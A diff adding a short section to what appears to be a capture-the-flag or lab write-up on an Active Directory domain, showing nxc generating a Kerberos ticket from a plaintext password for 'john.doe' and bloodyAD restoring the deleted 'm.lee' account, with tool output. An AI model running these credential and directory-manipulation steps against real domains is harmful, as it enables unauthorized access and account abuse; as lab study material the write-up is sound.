@@ -473,4 +473,28 @@ There is nothing in bloodhound of interest with the user `john.doe`
 
 # Restoring the `m.lee` object using `john.doe`
 
-So i cannot restore the user `m.lee` using 
+So i cannot restore the user `m.lee` using `john.doe` credentials instead ill generate a tgt for the user then restore the object using kerberos authentication
+
+```python
+nxc smb dc.novaforge.local -u john.doe -p 'johndoe1369' --smb-timeout 5 --generate-tgt johndoe
+SMB         10.0.0.100      445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:novaforge.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.0.100      445    DC               [+] novaforge.local\john.doe:johndoe1369 
+SMB         10.0.0.100      445    DC               [+] TGT saved to: johndoe.ccache
+SMB         10.0.0.100      445    DC               [+] Run the following command to use the TGT: export KRB5CCNAME=johndoe.ccache
+```
+
+First ill get the TGT
+
+```python
+export KRB5CCNAME=johndoe.ccache
+```
+
+Then ill export
+
+```python
+bloodyAD --host dc.novaforge.local -d novaforge.local -k set restore 'm.lee' 
+[+] m.lee has been restored successfully under CN=m.lee,CN=Users,DC=novaforge,DC=local
+```
+
+Now the object is restored!
+
